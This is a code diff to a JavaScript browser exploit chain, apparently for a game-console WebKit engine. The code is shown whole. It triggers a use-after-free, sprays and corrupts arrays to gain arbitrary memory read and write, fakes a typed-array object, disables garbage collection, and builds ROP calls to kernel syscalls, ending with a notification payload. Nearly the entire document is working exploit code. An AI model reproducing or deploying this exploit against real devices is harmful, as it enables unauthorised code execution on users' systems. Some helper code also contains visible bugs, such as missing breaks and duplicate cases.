@@ -249,7 +249,7 @@ class BigInt {
     }
 
     if (c !== 0) {
-      throw new Error('sub underflowed !!');
+      throw new Error('sub underflowed !!')
     }
 
     return ret
@@ -426,6 +426,261 @@ BigInt.TYPE_MAP = {
   Float64Array: 'f64',
 }
 
+DataView.prototype.getBigInt = function (byteOffset, littleEndian) {
+  littleEndian = (typeof littleEndian === 'undefined') ? false : littleEndian
+
+  var lo = this.getUint32(byteOffset, true)
+  var hi = this.getUint32(byteOffset + 4, true)
+
+  return new BigInt(hi, lo)
+}
+
+DataView.prototype.setBigInt = function (byteOffset, value, littleEndian) {
+  value = (value instanceof BigInt) ? value : new BigInt(value)
+  littleEndian = (typeof littleEndian === 'undefined') ? false : littleEndian
+
+  this.setUint32(byteOffset, value.lo(), littleEndian)
+  this.setUint32(byteOffset + 4, value.hi(), littleEndian)
+}
+
+var struct = {
+  register: function (name, fields) {
+    if (name in this) {
+      throw new Error(`${name} already registered in struct !!`)
+    }
+
+    var [sizeof, infos] = struct.parse(fields)
+
+    var cls = class {                    
+      constructor(addr) {
+        this.addr = addr
+      }
+    }
+
+    this[name] = cls
+
+    cls.tname = name
+    cls.sizeof = sizeof
+    cls.fields = fields
+
+    for (var info of infos) {
+      struct.define_property(cls, info)
+    }
+  },
+  unregister: function (name) {
+    if (!(name in this)) {
+        throw new Error(`${name} not registered in struct !!`)
+    }
+
+    delete this[name]
+
+    return true
+  },
+  parse: function (fields) {
+    var infos = []
+    var offset = 0
+    var struct_alignment = 1
+    for (var field of fields) {
+      var size = 0
+      var alignment = 0
+      var pointer = false
+      var type = field.type
+
+      var [, name, count] = field.name.match(/^(.+?)(?:\[(\d+)\])?$/)
+
+      if (type.includes('*')) {
+          size = 8
+          alignment = 8
+          pointer = true
+      } else if (field.name in this) {
+        size = this[field.name].sizeof   
+      } else {
+        var bits = type.replace(/\D/g, '')
+        if (bits % 8 !== 0) {
+          throw new Error(`Invalid primitive type ${type}`)
+        }
+
+        size = bits / 8
+        alignment = size
+      }
+
+      if (size == 0) {
+          throw new Error(`Invalid size for ${field_name} !!`)
+      }
+
+      count = count ? parseInt(count) : 1
+
+      if (offset % alignment !== 0) {
+          offset += alignment - (offset % alignment)
+      }
+
+      infos.push({type: type, name: name, offset: offset, size: size, count: count, pointer: pointer})
+
+      offset += size * count
+
+      if (alignment > struct_alignment) {
+          struct_alignment = alignment
+      }
+    }
+
+    if (offset % struct_alignment !== 0) {
+      offset += struct_alignment - (offset % struct_alignment)
+    }
+
+    return [offset, infos]
+  },
+  define_property: function (cls, info) {
+    Object.defineProperty(cls.prototype, info.name, {
+      get: function () {
+        if (info.count > 1) {
+          var addr = this.addr.add(info.offset)
+          if (info.pointer) {
+            addr = mem.read8(addr)
+          }
+
+          var arr
+          switch(info.type) {
+            case 'Int8': 
+              arr = new Int8Array(info.count)
+              utils.set_backing(arr, addr)
+              break
+            case 'Uint8':
+              arr = new Uint8Array(info.count)
+              utils.set_backing(arr, addr)
+              break
+            case 'Int16': 
+              arr = new Int16Array(info.count)
+              utils.set_backing(arr, addr)
+              break
+            case 'Uint16':
+              arr = new Uint16Array(info.count)
+              utils.set_backing(arr, addr)
+              break
+            case 'Int32':
+              arr = new Int32Array(info.count)
+              utils.set_backing(arr, addr)
+              break
+            case 'Uint32':
+              arr = new Uint32Array(info.count)
+              utils.set_backing(arr, addr)
+              break
+            case 'Int64':
+              arr = new Uint32Array(info.count * 2)
+              utils.set_backing(arr, addr)
+            case 'Uint64':
+              arr = new Uint32Array(info.count * 2)
+              utils.set_backing(arr, addr)
+            default:
+              if (info.type in this) {
+                for (var i = 0; i < info.count; i++) {
+                  arr[i] = new this[info.name](addr.add(i * info.size))
+                }
+              }
+
+              throw new Error(`Invalid type ${info.type}`)
+          }
+
+          return arr
+        } else {
+          var val = mem.read8(this.addr.add(info.offset))
+          switch(info.type) {
+            case 'Int8': return val.i8[0]
+            case 'Uint8': return val.u8[0]
+            case 'Int16': return val.i16[0]
+            case 'Uint16': return val.u16[0]
+            case 'Int32': return val.i32[0]
+            case 'Uint32': return val.u32[0]
+            case 'Int64': return val
+            case 'Uint64': return val
+            default:
+              if (info.pointer) {
+                return val
+              }
+                
+              throw new Error(`Invalid type ${info.type}`)
+          }
+        }
+      },
+      set: function (value) {
+        if (info.count > 1) {
+          if (!value.buffer) {
+            throw new Error('value is not a typed array')
+          }
+
+          if (value.buffer.byteLength !== info.size * info.count) {
+            throw new Error(`expected ${info.size * info.count} bytes got ${value.buffer.byteLength}`)
+          }
+              
+          var addr = this.addr.add(info.offset)
+          if (info.type.includes('*')) {
+            addr = mem.read8(addr)
+          }
+
+          var buf = new Uint8Array(info.size * info.count)
+          utils.set_backing(buf, addr)
+
+          buf.set(value)
+        } else {
+          var temp = mem.read8(this.addr.add(info.offset))
+          switch(info.type) {
+            case 'Int8': 
+              temp.i8[0] = value
+              break
+            case 'Uint8':
+              temp.u8[0] = value
+              break
+            case 'Int16':
+              temp.i16[0] = value
+              break
+            case 'Int16':
+              temp.u16[0] = value
+              break
+            case 'Int32':
+              temp.i32[0] = value
+              break
+            case 'Uint32':
+              temp.u32[0] = value
+              break
+            case 'Int64':
+              temp = value
+              break
+            case 'Uint64':
+              temp = value
+              break
+            default:
+              if (info.type.includes('*')) {
+                temp = value
+                break
+              }
+
+              throw new Error(`Invalid type ${info.type}`)
+          }
+
+          mem.write8(this.addr.add(info.offset), temp)
+        }
+      }
+    })
+  }
+}
+
+struct.register('NotificationRequest', [
+  {type: 'Int32', name: 'type'},
+  {type: 'Int32', name: 'reqId'},
+  {type: 'Int32', name: 'priority'},
+  {type: 'Int32', name: 'msg_id'},
+  {type: 'Int32', name: 'target_id'},
+  {type: 'Int32', name: 'user_id'},
+  {type: 'Int32', name: 'unk1'},
+  {type: 'Int32', name: 'unk2'},
+  {type: 'Int32', name: 'app_id'},
+  {type: 'Int32', name: 'error_num'},
+  {type: 'Int32', name: 'unk3'},
+  {type: 'Uint8', name: 'use_icon_image_uri'},
+  {type: 'Uint8', name: 'message[1024]'},
+  {type: 'Uint8', name: 'icon_uri[1024]'},
+  {type: 'Uint8', name: 'unk[1024]'},
+])
+
 function make_uaf (arr) {
   var o = {}
   for (var i in {xx: ''}) {
@@ -435,12 +690,9 @@ function make_uaf (arr) {
 }
 
 // needed for arw
-var prim_uaf_idx = -1
-var prim_spray_idx = -1
-var prim_marker = new BigInt(0x13371337, 0x13371337) // used to find sprayed array
-
-// store Uint32Array structure ids to be used for fake master id later
-var structs = new Array(0x100)
+var marked_arr_idx = -1
+var corrupted_spray_idx = -1
+var marker = new BigInt(0x13371337, 0x13371337) // used to find sprayed array
 
 // used for arw
 var master, slave
@@ -448,10 +700,11 @@ var master, slave
 // arw leak addresses
 var leak_obj, leak_obj_addr, master_addr
 
-// spray Uint32Array structure ids
-for (var i = 0; i < structs.length; i++) {
-  structs[i] = new Uint32Array(1)
-  structs[i][`spray_${i}`] = 0x1337
+// store Uint32Array structure ids to be used for fake master id later
+var u32_structs = new Array(0x100)
+for (var i = 0; i < u32_structs.length; i++) {
+  u32_structs[i] = new Uint32Array(1)
+  u32_structs[i][`spray_${i}`] = 0x1337
 }
 
 log('Initiate UAF...')
@@ -467,31 +720,31 @@ log('Achieved UAF !!')
 
 log('Spraying arrays with marker...')
 // spray candidates arrays to be used as leak primitive
-var spray = new Array(0x400)
+var spray = new Array(0x800)
 for (var i = 0; i < spray.length; i++) {
-    spray[i] = [prim_marker.jsv(), {}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {}]
+    spray[i] = [marker.jsv(), {}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {}]
 }
 
 log('Looking for marked array...')
 // find sprayed candidate by marker then corrupt its length 
 for (var i = 0; i < uaf_arr.length; i += 2) {
   var val = new BigInt(uaf_arr[i + 1], uaf_arr[i])
-  if (val.eq(prim_marker)) {
+  if (val.eq(marker)) {
     log(`Found marker at uaf_arr[${i}] !!`)
 
-    prim_uaf_idx = i - 2
+    marked_arr_idx = i - 2
 
-    log(`Marked array length ${new BigInt(uaf_arr[prim_uaf_idx])}`)
+    log(`Marked array length ${new BigInt(uaf_arr[marked_arr_idx])}`)
 
     log('Corrupting marked array length...')
     // corrupt indexing header
-    uaf_arr[prim_uaf_idx] = 0x1337
-    uaf_arr[prim_uaf_idx + 1] = 0x1337
+    uaf_arr[marked_arr_idx] = 0x1337
+    uaf_arr[marked_arr_idx + 1] = 0x1337
     break
   }
 }
 
-if (prim_uaf_idx === -1) {
+if (marked_arr_idx === -1) {
   throw new Error('Failed to find marked array !!')
 }
 
@@ -501,18 +754,18 @@ for (var i = 0; i < spray.length; i++) {
     log(`Found corrupted array at spray[${i}] !!`)
     log(`Corrupted array length ${new BigInt(spray[i].length)}`)
 
-    prim_spray_idx = i
+    corrupted_spray_idx = i
     break
   }
 }
 
-if (prim_spray_idx === -1) {
+if (corrupted_spray_idx === -1) {
   throw new Error('Failed to find corrupted array !!')
 }
 
 log('Initiate ARW...')
 
-var prim_uaf_obj_idx = prim_uaf_idx + 4
+var marked_arr_obj_idx = marked_arr_idx + 4
 
 slave = new Uint32Array(0x1000)
 slave[0] = 0x13371337
@@ -520,9 +773,9 @@ slave[0] = 0x13371337
 // leak address of leak_obj
 leak_obj = { obj: slave }
 
-spray[prim_spray_idx][1] = leak_obj
+spray[corrupted_spray_idx][1] = leak_obj
 
-leak_obj_addr = new BigInt(uaf_arr[prim_uaf_obj_idx + 1], uaf_arr[prim_uaf_obj_idx])
+leak_obj_addr = new BigInt(uaf_arr[marked_arr_obj_idx + 1], uaf_arr[marked_arr_obj_idx])
 
 // try faking Uint32Array master by incremental structure_id until it matches from one of sprayed earlier in structs array
 var structure_id = 0x80
@@ -534,16 +787,16 @@ while (!(master instanceof Uint32Array)) {
     length_and_flags: 0x1337
   }
 
-  spray[prim_spray_idx][1] = rw_obj
+  spray[corrupted_spray_idx][1] = rw_obj
 
-  var rw_obj_addr = new BigInt(uaf_arr[prim_uaf_obj_idx + 1], uaf_arr[prim_uaf_obj_idx])
+  var rw_obj_addr = new BigInt(uaf_arr[marked_arr_obj_idx + 1], uaf_arr[marked_arr_obj_idx])
 
   rw_obj_addr = rw_obj_addr.add(0x10)
 
-  uaf_arr[prim_uaf_obj_idx] = rw_obj_addr.lo()
-  uaf_arr[prim_uaf_obj_idx + 1] = rw_obj_addr.hi()
+  uaf_arr[marked_arr_obj_idx] = rw_obj_addr.lo()
+  uaf_arr[marked_arr_obj_idx + 1] = rw_obj_addr.hi()
 
-  master = spray[prim_spray_idx][1]
+  master = spray[corrupted_spray_idx][1]
 }
 
 master_addr = new BigInt(master[5], master[4])
@@ -591,7 +844,7 @@ var mem = {
   },
   malloc: function (count) {
     var buf = new Uint8Array(count)
-    var backing = mem.backing(buf)
+    var backing = utils.get_backing(buf)
     mem.allocs.set(backing, buf)
     return backing
   },
@@ -600,12 +853,18 @@ var mem = {
       mem.allocs.delete(addr)
     }
   },
-  base_addr(func_addr) {
+  free_all: function () {
+    mem.allocs.clear()
+  }
+}
+
+var utils = {
+  base_addr: function (func_addr) {
     var module_info_addr = mem.malloc(0x130)
 
     mem.write8(module_info_addr, new BigInt(0x130))
 
-    if (!fn.sceKernelGetModuleInfoForUnwind(func_addr, BigInt.One, module_info_addr).eq(BigInt.Zero)) {
+    if (!fn.sceKernelGetModuleInfoForUnwind(func_addr, 1, module_info_addr).eq(0)) {
       throw new Error(`Unable to get ${func_addr} base addr`)
     }
 
@@ -615,14 +874,32 @@ var mem = {
 
     return base_addr
   },
-  free_all () {
-    mem.allocs.clear()
+  notify: function (msg) {
+    var notify_addr = mem.malloc(struct.NotificationRequest.sizeof)
+
+    var notify = new struct.NotificationRequest(notify_addr)
+
+    for (var i = 0; i < msg.length; i++) {
+      notify.message[i] = msg.charCodeAt(i) & 0xFF
+    }
+
+    notify.message[msg.length] = 0
+
+    var fd = fn.open('/dev/notification0', 1, 0)
+    if (fd.lt(0)) {
+      throw new Error('Unable to open /dev/notification0 !!')
+    }
+
+    fn.write(fd, notify.addr, struct.NotificationRequest.sizeof)
+    fn.close(fd)
+
+    mem.free(notify_addr)
   },
   str: function (addr) {
     var chars = []
 
     var term = false
-    var offset = new BigInt()
+    var offset = 0
     while (!term) {
       var val = mem.read8(addr.add(offset))
       for (var i = 0; i < val.u8.length; i++) {
@@ -635,7 +912,7 @@ var mem = {
         chars.push(c)
       }
 
-      offset = offset.add(8)
+      offset += 8
     }
 
     return String.fromCharCode(chars)
@@ -649,20 +926,23 @@ var mem = {
 
     bytes[str.length] = 0
 
-    var backing = mem.backing(bytes)
+    var backing = utils.get_backing(bytes)
     mem.allocs.set(backing, bytes)
     return backing
   },
-  backing (buf) {
-    return mem.read8(mem.addrof(buf).add(0x10))
+  get_backing: function(view) {
+    return mem.read8(mem.addrof(view).add(0x10))
+  },
+  set_backing: function(view, addr) {
+    return mem.write8(mem.addrof(view).add(0x10), addr)
   }
 }
 
 var math_min_addr = mem.addrof(Math.min)
 debug(`addrof(Math.min): ${math_min_addr}`)
 
-var class_info = mem.read8(math_min_addr.add(0x10))
-debug(`class_info: ${class_info}`)
+var scope = mem.read8(math_min_addr.add(0x10))
+debug(`scope: ${scope}`)
 
 var native_executable = mem.read8(math_min_addr.add(0x18))
 debug(`native_executable: ${native_executable}`)
@@ -674,6 +954,9 @@ var native_executable_constructor = mem.read8(native_executable.add(0x48))
 debug(`native_executable_constructor: ${native_executable_constructor}`)
 
 var jsc_addr = native_executable_function.sub(0xC6380)
+
+mem.write4(jsc_addr.add(0x1E75B20), 1)
+log('disabled GC')
 
 var _error_addr = mem.read8(jsc_addr.add(0x1E72398))
 debug(`_error_addr: ${_error_addr}`)
@@ -813,7 +1096,7 @@ var rop = {
     var fake_addr = mem.addrof(fake)
     debug(`addrof(fake): ${fake_addr}`)
 
-    mem.write8(fake_addr.add(0x10), class_info)
+    mem.write8(fake_addr.add(0x10), scope)
     mem.write8(fake_addr.add(0x18), fake_native_executable)
 
     fake.executable = fake_native_executable
@@ -874,10 +1157,11 @@ var fn = {
 
         switch (typeof value) {
           case 'boolean':
+          case 'number':
             value = new BigInt(value)
             break
           case 'string':
-            value = mem.cstr(value)
+            value = utils.cstr(value)
             ctx.push(value)
             break
           default:
@@ -928,7 +1212,7 @@ var fn = {
               result = result.eq(BigInt.One)
               break
             case 'string':
-              result = mem.str(result)
+              result = utils.str(result)
               break
             default:
               throw new Error(`Unsupported return type ${ret}`)
@@ -960,7 +1244,7 @@ rop.init()
 
 fn.register(libc_addr.add(0x5F0), 'sceKernelGetModuleInfoForUnwind', 'bigint')
 
-var libkernel_addr = mem.base_addr(_error_addr)
+var libkernel_addr = utils.base_addr(_error_addr)
 
 log(`jsc address: ${jsc_addr}`)
 log(`libc address: ${libc_addr}`)
@@ -989,7 +1273,7 @@ var syscalls = {
 
             var id = match.shl(8).hi()
 
-            syscalls.map.set(id, new BigInt(start_offset))
+            syscalls.map.set(id, addr.add(start_offset))
 
             pattern_idx = 0
             continue
@@ -1003,6 +1287,9 @@ var syscalls = {
         offset++
       }
     }
+  },
+  clear: function () {
+    syscalls.map.clear()
   }
 }
 
@@ -1014,3 +1301,8 @@ fn.register(_error_addr, '_error', 'bigint')
 fn.register(strerror_addr, 'strerror', 'string')
 fn.register(0x14, 'getpid', 'bigint')
 fn.register(0x29, 'dup', 'bigint')
+fn.register(0x4, 'write', 'bigint')
+fn.register(0x5, 'open', 'bigint')
+fn.register(0x6, 'close', 'bigint')
+
+utils.notify('UwU')
